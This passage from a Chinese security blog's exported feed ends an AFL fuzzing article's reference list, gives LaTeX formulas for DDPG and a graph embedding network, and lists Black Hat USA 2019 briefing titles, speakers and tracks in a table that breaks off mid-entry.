<li><a href="https://paper.seebug.org/842/">AFL 漏洞挖掘技术漫谈（二）：Fuzz 结果分析和代码覆盖率</a>：各种辅助分析的工具<ul>
<li><code>afl-cmin -i input_dir -o output_dir -- /path/to/tested/program [params] @@</code></li>
</ul>
</li>
<li><a href="https://bbs.pediy.com/thread-257399.htm">AFL学习笔记（上）</a>：持续更新中</li>
<li><a href="https://bbs.pediy.com/thread-249912.htm">漏洞挖掘技术之 AFL 项目分析</a></li>
</ul>
<h1 id="Fuzz-相关文章"><a href="#Fuzz-相关文章" class="headerlink" title="Fuzz 相关文章"></a>Fuzz 相关文章</h1><ul>
<li><a href="https://mp.weixin.qq.com/s/nREiT1Uj25igCMWu1kta9g">Fuzzing战争: 从刀剑弓斧到星球大战</a></li>
</ul>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>如你所见，研究人员仍在积极地改进 AFL，而且 AFL 还存在进行实验和创新的空间，我们也可以创建一个我们自己的实用有趣的 AFL。</p>
<p>感谢阅读，祝大家 Fuzz 顺利。</p>
<p><a href="https://habr.com/ru/company/dsec/blog/449134/">原文链接</a></p>
]]></content>
      <categories>
        <category>漏洞挖掘</category>
      </categories>
      <tags>
        <tag>外文翻译</tag>
        <tag>漏洞挖掘</tag>
        <tag>AFL</tag>
      </tags>
  </entry>
  <entry>
    <title>AI 算法中的数学公式</title>
    <url>/2019/05/24/AI%E7%AE%97%E6%B3%95%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/</url>
    <content><![CDATA[<p>AI 算法中的一些数学公式</p>
<span id="more"></span>
<h2 id="DDPG"><a href="#DDPG" class="headerlink" title="DDPG"></a><a href="https://arxiv.org/pdf/1509.02971.pdf">DDPG</a></h2><script type="math/tex; mode=display">
\begin{aligned}
\nabla_{\theta^\mu}J&\approx\mathbb{E}_{s_t\backsim\rho^\beta}[\nabla_{\theta^\mu}Q(s,a|\theta^Q)|_{s=s_t,a=\mu(s_t|\theta^\mu)}] \\\\
&=\mathbb{E}_{s_t\backsim\rho^\beta}[\nabla_{a}Q(s,a|\theta^Q)|_{s=s_t,a=\mu(s_t)}\nabla_{\theta_\mu}\mu(s|\theta^\mu)|_{s=s_t}]
\end{aligned}</script><h2 id="GEN"><a href="#GEN" class="headerlink" title="GEN"></a>GEN</h2><script type="math/tex; mode=display">g=<V,E,\phi></script><script type="math/tex; mode=display">\forall v\in V,v\rightarrow x_v\rightarrow \mu_v</script><script type="math/tex; mode=display">N_v</script><script type="math/tex; mode=display">\mu_v=F(x_v,\sum_{j\in N_v}\mu_j)</script><script type="math/tex; mode=display">P=\lbrace P_1,P_2,\cdots,P_n\rbrace</script><script type="math/tex; mode=display">ReLU(\cdot)=max\lbrace 0,\cdot\rbrace</script><script type="math/tex; mode=display">\mu_v^{(t)}=tanh(W_1x_v+\sigma(\sum_{j\in N_v}\mu_j^{(t-1)}))</script><script type="math/tex; mode=display">\sigma(x)=P_1ReLU(P_2\cdots ReLU(P_n(x)))</script><script type="math/tex; mode=display">\mu_g=W_2\sum_{v\in V}\mu_v^T</script><script type="math/tex; mode=display">Z=W_3\mu_g</script><script type="math/tex; mode=display">Q=\lbrace p,1-p\rbrace,p\in[0,1]</script><script type="math/tex; mode=display">Q=Softmax(Z)</script><script type="math/tex; mode=display">\min_{W_1,W_2,W_3,...,P_1,P_2,...,P_n}\sum_{i=1}^m(H(Q,l))</script><p>在<a href="https://stackedit.io/editor">这里</a>将Markdown的公式转换为MathML代码（Word）<a href="https://blog.csdn.net/bendanban/article/details/52823171">参考</a></p>
]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
      <tags>
        <tag>数学原理</tag>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Black Hat USA 2019 Briefings一览</title>
    <url>/2019/08/14/Black-Hat-USA-2019-Briefings%E4%B8%80%E8%A7%88/</url>
    <content><![CDATA[<p><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html">议题地址</a></p>
<p><a href="https://www.youtube.com/playlist?list=PLH15HpR5qRsWrfkjwFSI256x1u2Zy49VI&amp;hootPostID=c85fbdb76ae4b957bf70f00f346caa62">会议视频</a></p>
<p><a href="https://github.com/ZanderChang/blackhat2019-kg">爬虫导入 Neo4j</a></p>
<p>Briefings 在 8.7~8.8 举行，共 21 类，123 个议题</p>
<p><img src="/img/blackhat2019/titles_wordcloud.png" alt=""></p>
<span id="more"></span>
<h1 id="TRACKS"><a href="#TRACKS" class="headerlink" title="TRACKS"></a>TRACKS</h1><ul>
<li>Malware <em>6</em></li>
<li>Exploit Development <em>17</em></li>
<li>Platform Security <em>13</em></li>
<li>Community <em>8</em></li>
<li>Applied Security <em>21</em></li>
<li>Hardware/Embedded <em>17</em></li>
<li>Human Factors <em>12</em></li>
<li>Cyber Insurance <em>3</em></li>
<li>Reverse Engineering <em>11</em></li>
<li>Web AppSec <em>15</em></li>
<li>Enterprise <em>12</em></li>
<li>Internet of Things <em>8</em></li>
<li>Cryptography <em>5</em></li>
<li>Mobile <em>12</em></li>
<li>Policy <em>12</em></li>
<li>Security Development Lifecycle <em>11</em></li>
<li>Smart Grid/Industrial Security <em>5</em></li>
<li>Data Forensics/Incident Response <em>9</em></li>
<li>Network Defense <em>13</em></li>
<li>Bug Bounty <em>3</em></li>
<li>Keynote <em>1</em></li>
</ul>
<p><img src="/img/blackhat2019/tracks.png" alt=""></p>
<h1 id="TITLES"><a href="#TITLES" class="headerlink" title="TITLES"></a>TITLES</h1><div class="table-container">
<table>
<thead>
<tr>
<th></th>
<th>Titles</th>
<th>Speakers</th>
<th>Tracks</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#flying-a-false-flag-advanced-c-trust-conflicts-and-domain-takeover-15254">Flying a False Flag: Advanced C2, Trust Conflicts, and Domain Takeover</a> <a href="https://github.com/monoxgas/FlyingAFalseFlag">GitHub</a></td>
<td>Nick Landers</td>
<td>Malware</td>
</tr>
<tr>
<td>2</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#battle-of-windows-service-a-silver-bullet-to-discover-file-privilege-escalation-bugs-automatically-14688">Battle of Windows Service: A Silver Bullet to Discover File Privilege Escalation Bugs Automatically</a></td>
<td>Wenxu Wu</td>
<td>Exploit Development,Platform Security</td>
</tr>
<tr>
<td>3</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#hacking-your-non-compete-16446">Hacking Your Non-Compete</a></td>
<td>Brian Dykstra,Gregory Stone</td>
<td>Community</td>
</tr>
<tr>
<td>4</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#he-said-she-said--poisoned-rdp-offense-and-defense-15602">He Said, She Said – Poisoned RDP Offense and Defense</a></td>
<td>Eyal Itkin,Dana Baril</td>
<td>Exploit Development,Applied Security</td>
</tr>
<tr>
<td>5</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#lessons-and-lulz-the-th-annual-black-hat-usa-noc-report-17069">Lessons and Lulz: The 5th Annual Black Hat USA NOC Report</a></td>
<td>Bart Stump,Neil Wyler</td>
<td>Applied Security</td>
</tr>
<tr>
<td>6</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#biometric-authentication-under-threat-liveness-detection-hacking-16130">Biometric Authentication Under Threat: Liveness Detection Hacking</a></td>
<td>Zhuo Ma,Bin Ma,Yu Chen</td>
<td>Hardware/Embedded,Human Factors</td>
</tr>
<tr>
<td>7</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#how-do-cyber-insurers-view-the-world-17255">How Do Cyber Insurers View The World?</a></td>
<td>Matt Prevost</td>
<td>Cyber Insurance</td>
</tr>
<tr>
<td>8</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#hunting-for-bugs-catching-dragons-15552">Hunting for Bugs, Catching Dragons</a> 对 Outlook/Exchange 漏洞及利用的总结</td>
<td>Nicolas Joly</td>
<td>Reverse Engineering,Exploit Development</td>
</tr>
<tr>
<td>9</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#internet-scale-analysis-of-aws-cognito-security-15829">Internet-Scale Analysis of AWS Cognito Security</a></td>
<td>Andres Riancho</td>
<td>Web AppSec,Enterprise</td>
</tr>
<tr>
<td>10</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#moving-from-hacking-iot-gadgets-to-breaking-into-one-of-europes-highest-hotel-suites-16099">Moving from Hacking IoT Gadgets to Breaking into One of Europe’s Highest Hotel Suites</a></td>
<td>Michael Huebler,Ray .</td>
<td>Hardware/Embedded,Internet of Things</td>
</tr>
<tr>
<td>11</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#messaging-layer-security-towards-a-new-era-of-secure-group-messaging-16230">Messaging Layer Security: Towards a New Era of Secure Group Messaging</a></td>
<td>Katriel Cohn-Gordon,Raphael Robert,Benjamin Beurdouche</td>
<td>Applied Security,Cryptography</td>
</tr>
<tr>
<td>12</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#bypassing-the-maginot-line-remotely-exploit-the-hardware-decoder-on-smartphone-14556">Bypassing the Maginot Line: Remotely Exploit the Hardware Decoder on Smartphone</a></td>
<td>Peter Pi,Xiling Gong</td>
<td>Exploit Development,Mobile</td>
</tr>
<tr>
<td>13</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#the-cyber-shell-game--war-information-warfare-and-the-darkening-web-17114">The Cyber Shell Game – War, Information Warfare, and the Darkening Web</a></td>
<td>Alexander Klimburg</td>
<td>Policy</td>
</tr>
<tr>
<td>14</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#cybersecurity-risk-assessment-for-safety-critical-systems-15631">Cybersecurity Risk Assessment for Safety-Critical Systems</a></td>
<td>Daniel Johnson,Ken Heffner,Ly Vessels</td>
<td>Security Development Lifecycle,Smart Grid/Industrial Security</td>
</tr>
<tr>
<td>15</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#clickonce-and-youre-in---when-appref-ms-abuse-is-operating-as-intended-15375">ClickOnce and You’re in - When Appref-ms Abuse is Operating as Intended</a></td>
<td>William Burke</td>
<td>Human Factors,Applied Security</td>
</tr>
<tr>
<td>16</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#deconstructing-the-phishing-campaigns-that-target-gmail-users-15771">Deconstructing the Phishing Campaigns that Target Gmail Users</a></td>
<td>Daniela Oliveira,Elie Bursztein</td>
<td>Human Factors</td>
</tr>
<tr>
<td>17</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#detecting-deep-fakes-with-mice-14467">Detecting Deep Fakes with Mice</a></td>
<td>Alex Comerford,Jonathan Saunders,George Williams</td>
<td>Human Factors,Data Forensics/Incident Response</td>
</tr>
<tr>
<td>18</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#defense-against-rapidly-morphing-ddos-16440">Defense Against Rapidly Morphing DDOS</a></td>
<td>Mikhail Fedorov,Mudit Tyagi</td>
<td>Enterprise,Network Defense</td>
</tr>
<tr>
<td>19</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#detecting-malicious-files-with-yara-rules-as-they-traverse-the-network-16221">Detecting Malicious Files with YARA Rules as They Traverse the Network</a></td>
<td>David Bernal</td>
<td>Data Forensics/Incident Response,Network Defense</td>
</tr>
<tr>
<td>20</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#going-beyond-coverage-guided-fuzzing-with-structured-fuzzing-16110">Going Beyond Coverage-Guided Fuzzing with Structured Fuzzing</a></td>
<td>Jonathan Metzman</td>
<td>Security Development Lifecycle</td>
</tr>
<tr>
<td>21</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#paging-all-windows-geeks--finding-evil-in-windows--compressed-memory-15582">Paging All Windows Geeks – Finding Evil in Windows 10 Compressed Memory</a></td>
<td>Dimiter Andonov,Omar Sardar</td>
<td>Reverse Engineering,Data Forensics/Incident Response</td>
</tr>
<tr>
<td>22</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#minimum-failure---stealing-bitcoins-with-electromagnetic-fault-injection-14593">MINimum Failure - Stealing Bitcoins with Electromagnetic Fault Injection</a></td>
<td>Colin O’Flynn</td>
<td>Mobile,Hardware/Embedded</td>
</tr>
<tr>
<td>23</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#periscope-an-effective-probing-and-fuzzing-framework-for-the-hardware-os-boundary-15693">PeriScope: An Effective Probing and Fuzzing Framework for the Hardware-OS Boundary</a></td>
<td>Dokyung Song</td>
<td>Platform Security,Mobile</td>
</tr>
<tr>
<td>24</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#reverse-engineering-whatsapp-encryption-for-chat-manipulation-and-more-15540">Reverse Engineering WhatsApp Encryption for Chat Manipulation and More</a></td>
<td>Oded Vanunu,Roman Zaikin</td>
<td>Reverse Engineering,Web AppSec</td>
</tr>
<tr>
<td>25</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#legal-gnss-spoofing-and-its-effects-on-autonomous-vehicles-15497">Legal GNSS Spoofing and its Effects on Autonomous Vehicles</a></td>
<td>Victor Murray</td>
<td>Hardware/Embedded,Internet of Things</td>
</tr>
<tr>
<td>26</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#transparency-in-the-software-supply-chain-making-sbom-a-reality-16265">Transparency in the Software Supply Chain: Making SBOM a Reality</a></td>
<td>Allan Friedman</td>
<td>Security Development Lifecycle,Policy</td>
</tr>
<tr>
<td>27</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#monsters-in-the-middleboxes-building-tools-for-detecting-https-interception-16617">Monsters in the Middleboxes: Building Tools for Detecting HTTPS Interception</a></td>
<td>Gabriele Fisher,Luke Valenta</td>
<td>Web AppSec,Network Defense</td>
</tr>
<tr>
<td>28</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#attack-surface-as-a-service-17042">Attack Surface as a Service</a></td>
<td>Anna Westelius</td>
<td>Web AppSec</td>
</tr>
<tr>
<td>29</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#death-to-the-ioc-whats-next-in-threat-intelligence-15392">Death to the IOC: What’s Next in Threat Intelligence</a></td>
<td>Bhavna Soman</td>
<td>Enterprise,Data Forensics/Incident Response</td>
</tr>
<tr>
<td>30</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#gdparrrrr-using-privacy-laws-to-steal-identities-14526">GDPArrrrr: Using Privacy Laws to Steal Identities</a></td>
<td>James Pavur</td>
<td>Human Factors,Policy</td>
</tr>
<tr>
<td>31</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#sso-wars-the-token-menace-15092">SSO Wars: The Token Menace</a></td>
<td>Oleksandr Mirosh,Alvaro Munoz</td>
<td>Enterprise,Web AppSec</td>
</tr>
<tr>
<td>32</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#mobile-interconnect-threats-how-next-gen-products-may-be-already-outdated-15833">Mobile Interconnect Threats: How Next-Gen Products May be Already Outdated</a></td>
<td>Guillaume Teissier</td>
<td>Exploit Development,Network Defense</td>
</tr>
<tr>
<td>33</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#on-trust-stories-from-the-front-lines-16310">On Trust: Stories from the Front Lines</a></td>
<td>Jamil Farshchi</td>
<td>Enterprise</td>
</tr>
<tr>
<td>34</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#shifting-knowledge-left-keeping-up-with-modern-application-security-15323">Shifting Knowledge Left: Keeping up with Modern Application Security</a></td>
<td>Fletcher Heisler,Mark Stanislav</td>
<td>Human Factors,Security Development Lifecycle</td>
</tr>
<tr>
<td>35</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#apics-adventures-in-wonderland-15073">APIC’s Adventures in Wonderland</a></td>
<td>Frank Block,Oliver Matula</td>
<td>Exploit Development,Network Defense</td>
</tr>
<tr>
<td>36</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#testing-your-organizations-social-media-awareness-17130">Testing Your Organization’s Social Media Awareness</a></td>
<td>Jacob Wilkin</td>
<td>Human Factors</td>
</tr>
<tr>
<td>37</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#the-future-of-securing-intelligent-electronic-devices-using-the-iec---standard-for-monitoring-16401">The Future of Securing Intelligent Electronic Devices Using the IEC 62351-7 Standard for Monitoring</a></td>
<td>Younes Dragoni,Alessandro Di Pinto,Andrea Carcano</td>
<td>Smart Grid/Industrial Security</td>
</tr>
<tr>
<td>38</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#attacking-and-defending-the-microsoft-cloud-office---azure-ad-14553">Attacking and Defending the Microsoft Cloud (Office 365 &amp; Azure AD)</a></td>
<td>Mark Morowczynski,Sean Metcalf</td>
<td>Network Defense,Enterprise</td>
</tr>
<tr>
<td>39</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#webauthn----demystifying-webauthn-14687">WebAuthn 101 - Demystifying WebAuthn</a></td>
<td>Christiaan Brand</td>
<td>Web AppSec,Applied Security</td>
</tr>
<tr>
<td>40</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#woke-hiring-wont-save-us-an-actionable-approach-to-diversity-hiring-and-retention-16598">Woke Hiring Won’t Save Us: An Actionable Approach to Diversity Hiring and Retention</a></td>
<td>Rebecca Lynch</td>
<td>Policy,Community</td>
</tr>
<tr>
<td>41</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#-seconds-of-solitude-defeating-cisco-trust-anchor-with-fpga-bitstream-shenanigans-15817">100 Seconds of Solitude: Defeating Cisco Trust Anchor With FPGA Bitstream Shenanigans</a></td>
<td>Ang Cui,Richard Housley,Jatin Kataria</td>
<td>Reverse Engineering,Hardware/Embedded</td>
</tr>
<tr>
<td>42</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#attacking-electric-motors-for-fun-and-profit-16141">Attacking Electric Motors for Fun and Profit</a></td>
<td>Duminda Wijesekera,Matthew Jablonski</td>
<td>Internet of Things,Smart Grid/Industrial Security</td>
</tr>
<tr>
<td>43</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#all-your-apple-are-belong-to-us-unique-identification-and-cross-device-tracking-of-apple-devices-15483">All Your Apple are Belong to Us: Unique Identification and Cross-Device Tracking of Apple Devices</a></td>
<td>Xiaolong Bai,Min Zheng</td>
<td>Applied Security,Mobile</td>
</tr>
<tr>
<td>44</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#behind-the-scenes-the-industry-of-social-media-manipulation-driven-by-malware-15754">Behind the Scenes: The Industry of Social Media Manipulation Driven by Malware</a></td>
<td>Olivier Bilodeau,Masarah Paquet-Clouston</td>
<td>Malware,Human Factors</td>
</tr>
<tr>
<td>45</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#breaking-through-another-side-bypassing-firmware-security-boundaries-from-embedded-controller-15902">Breaking Through Another Side: Bypassing Firmware Security Boundaries from Embedded Controller</a></td>
<td>Alexandre Gazet,Alex Matrosov</td>
<td>Platform Security,Reverse Engineering</td>
</tr>
<tr>
<td>46</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#denial-of-service-with-a-fistful-of-packets-exploiting-algorithmic-complexity-vulnerabilities-16445">Denial of Service with a Fistful of Packets: Exploiting Algorithmic Complexity Vulnerabilities</a></td>
<td>David Renardy,Nathan Hauke</td>
<td>Exploit Development,Web AppSec</td>
</tr>
<tr>
<td>47</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#information-security-in-the-public-interest-15859">Information Security in the Public Interest</a></td>
<td>Bruce Schneier</td>
<td>Policy,Community</td>
</tr>
<tr>
<td>48</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#planning-a-bug-bounty-the-nuts-and-bolts-from-concept-to-launch-17345">Planning a Bug Bounty: The Nuts and Bolts from Concept to Launch</a></td>
<td>Adam Ruddermann</td>
<td>Bug Bounty</td>
</tr>
<tr>
<td>49</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#dragonblood-attacking-the-dragonfly-handshake-of-wpa-15991">Dragonblood: Attacking the Dragonfly Handshake of WPA3</a></td>
<td>Mathy Vanhoef</td>
<td>Network Defense,Cryptography</td>
</tr>
<tr>
<td>50</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#exploiting-the-hyper-v-ide-emulator-to-escape-the-virtual-machine-15862">Exploiting the Hyper-V IDE Emulator to Escape the Virtual Machine</a></td>
<td>Joe Bialek</td>
<td>Platform Security,Exploit Development</td>
</tr>
<tr>
<td>51</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#playing-offense-and-defense-with-deepfakes-14661">Playing Offense and Defense with Deepfakes</a></td>
<td>Matt Price,Mike Price</td>
<td>Human Factors</td>
</tr>
<tr>
<td>52</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#project-zero-five-years-of-make-day-hard-15900">Project Zero: Five Years of ‘Make 0Day Hard’</a></td>
<td>Ben Hawkes</td>
<td>Platform Security,Exploit Development</td>
</tr>
<tr>
<td>53</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#hacking-for-the-greater-good-empowering-technologists-to-strengthen-digital-society-17065">Hacking for the Greater Good: Empowering Technologists to Strengthen Digital Society</a></td>
<td>Eva Galperin,Camille Francois,Bruce Schneier</td>
<td>Community</td>
</tr>
<tr>
<td>54</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#rough-and-ready-frameworks-to-measure-persistent-engagement-and-deterrence-15140">Rough and Ready: Frameworks to Measure Persistent Engagement and Deterrence</a></td>
<td>Neil Jenkins,Jason Healey</td>
<td>Data Forensics/Incident Response,Policy</td>
</tr>
<tr>
<td>55</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#the-enemy-within-modern-supply-chain-attacks-16241">The Enemy Within: Modern Supply Chain Attacks</a></td>
<td>Eric Doerr</td>
<td>Data Forensics/Incident Response,Enterprise</td>
</tr>
<tr>
<td>56</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#picodma-dma-attacks-at-your-fingertips-15851">PicoDMA: DMA Attacks at Your Fingertips</a></td>
<td>Ben Blaxill,Joel Sandin</td>
<td>Platform Security,Hardware/Embedded</td>
</tr>
<tr>
<td>57</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#api-induced-ssrf-how-apple-pay-scattered-vulnerabilities-across-the-web-14462">API-Induced SSRF: How Apple Pay Scattered Vulnerabilities Across the Web</a></td>
<td>Joshua Maddux</td>
<td>Applied Security,Web AppSec</td>
</tr>
<tr>
<td>58</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#bounty-operations-best-practices-and-common-pitfalls-to-avoid-in-the-first---months-17346">Bounty Operations: Best Practices and Common Pitfalls to Avoid in the First 6-12 Months</a></td>
<td>Josh Jay,Greg Caswell,Shannon Sabens,Jarek Stanley</td>
<td>Bug Bounty</td>
</tr>
<tr>
<td>59</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#the-most-secure-browser-pwning-chrome-from--to--16274">The Most Secure Browser? Pwning Chrome from 2016 to 2019</a></td>
<td>Gengming Liu,Zhen Feng</td>
<td>Exploit Development,Platform Security</td>
</tr>
<tr>
<td>60</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#breaking-encrypted-databases-generic-attacks-on-range-queries-17040">Breaking Encrypted Databases: Generic Attacks on Range Queries</a></td>
<td>Marie-Sarah Lacharite</td>
<td>Cryptography</td>
</tr>
<tr>
<td>61</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#devsecops--what-why-and-how-17058">DevSecOps : What, Why and How</a></td>
<td>Anant Shrivastava</td>
<td>Security Development Lifecycle,Applied Security</td>
</tr>
<tr>
<td>62</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#finding-our-path-how-were-trying-to-improve-active-directory-security-17075">Finding Our Path: How We’re Trying to Improve Active Directory Security</a>介绍 BloodHound，BloodHound 将获取 Domain Admin 方式以地图方式展示出来，并且能计算出最佳路径，大大提高了域渗透的效率</td>
<td>Will Schroeder,Rohan Vazarkar,Andy Robbins</td>
<td>Enterprise</td>
</tr>
<tr>
<td>63</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#all-the-g-modules-could-be-hacked-16187">All the 4G Modules Could be Hacked</a>百度安全实验室，移动网络 4G 安全攻击面</td>
<td>Zhang Ye,Zheng Huang,Haikuo Xie,Shupeng Gao</td>
<td>Hardware/Embedded,Internet of Things</td>
</tr>
<tr>
<td>64</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#operational-templates-for-state-level-attack-and-collective-defense-of-countries-15755">Operational Templates for State-Level Attack and Collective Defense of Countries</a></td>
<td>Robert Fanelli,Gregory Conti</td>
<td>Applied Security,Network Defense</td>
</tr>
<tr>
<td>65</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#process-injection-techniques---gotta-catch-them-all-16010">Process Injection Techniques - Gotta Catch Them All</a>Windows 10 x64 进程注入技术总结（有开源代码），CFG 和 CIG 对各种技术的影响</td>
<td>Amit Klein,Itzik Kotler</td>
<td>Exploit Development,Malware</td>
</tr>
<tr>
<td>66</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#rogue-rogue-engineering-station-attacks-on-s-simatic-plcs-16049">Rogue7: Rogue Engineering-Station Attacks on S7 Simatic PLCs</a></td>
<td>Eli Biham,Avishai Wool,Sara Bitan,Uriel Malin</td>
<td>Reverse Engineering,Smart Grid/Industrial Security</td>
</tr>
<tr>
<td>67</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#behind-the-scenes-of-intel-security-and-manageability-engine-15789">Behind the Scenes of Intel Security and Manageability Engine</a></td>
<td>Yanai Moyal,Shai Hasarfaty</td>
<td>Applied Security,Hardware/Embedded</td>
</tr>
<tr>
<td>68</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#women-in-security-building-a-female-infosec-community-in-korea-japan-and-taiwan-16476">Women in Security: Building a Female InfoSec Community in Korea, Japan, and Taiwan</a></td>
<td>Hazel Yen,Suhee Kang,Asuka Nakajima</td>
<td>Community</td>
</tr>
<tr>
<td>69</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#cyber-insurance--for-cisos-17253">Cyber Insurance 101 for CISO’s</a></td>
<td>Jeffrey Smith</td>
<td>Cyber Insurance</td>
</tr>
<tr>
<td>70</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#-days--mitigations-roadways-to-exploit-and-secure-connected-bmw-cars-15313">0-days &amp; Mitigations: Roadways to Exploit and Secure Connected BMW Cars</a></td>
<td>Hendrik Schweppe,Michael Gruffke,Wenkai Zhang,Aohui Wang,Zhiqiang Cai</td>
<td>Hardware/Embedded,Internet of Things</td>
</tr>
<tr>
<td>71</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#behind-the-scenes-of-ios-and-mac-security-17220">Behind the scenes of iOS and Mac Security</a></td>
<td>Ivan Krstić</td>
<td>Mobile,Platform Security</td>
</tr>
<tr>
<td>72</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#http-desync-attacks-smashing-into-the-cell-next-door-15153">HTTP Desync Attacks: Smashing into the Cell Next Door</a></td>
<td>James Kettle</td>
<td>Web AppSec</td>
</tr>
<tr>
<td>73</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#exploiting-qualcomm-wlan-and-modem-over-the-air-15481">Exploiting Qualcomm WLAN and Modem Over The Air</a>腾讯安全 Blade Team，利用 WiFi 漏洞 RCE</td>
<td>Peter Pi,Xiling Gong</td>
<td>Exploit Development,Mobile</td>
</tr>
<tr>
<td>74</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#firmware-cartography-charting-the-course-for-modern-server-compromise-16432">Firmware Cartography: Charting the Course for Modern Server Compromise</a></td>
<td>Dionysus Blazakis,Nathan Keltner</td>
<td>Platform Security,Hardware/Embedded</td>
</tr>
<tr>
<td>75</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#ghidra---journey-from-classified-nsa-tool-to-open-source-16309">Ghidra - Journey from Classified NSA Tool to Open Source</a></td>
<td>Chris Delikat,Brian Knighton</td>
<td>Reverse Engineering</td>
</tr>
<tr>
<td>76</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#im-unique-just-like-you-human-side-channels-and-their-implications-for-security-and-privacy-16267">I’m Unique, Just Like You: Human Side-Channels and Their Implications for Security and Privacy</a></td>
<td>Matt Wixey</td>
<td>Applied Security,Human Factors</td>
</tr>
<tr>
<td>77</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#infighting-among-russian-security-services-in-the-cyber-sphere-14693">Infighting Among Russian Security Services in the Cyber Sphere</a></td>
<td>Kimberly Zenz</td>
<td>Policy</td>
</tr>
<tr>
<td>78</td>
<td><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#its-not-what-you-know-its-what-you-do-how-data-can-shape-security-engagement-16614">It’s Not What You Know, It’s What You Do: How Data Can Shape Security Engagement</a></td>
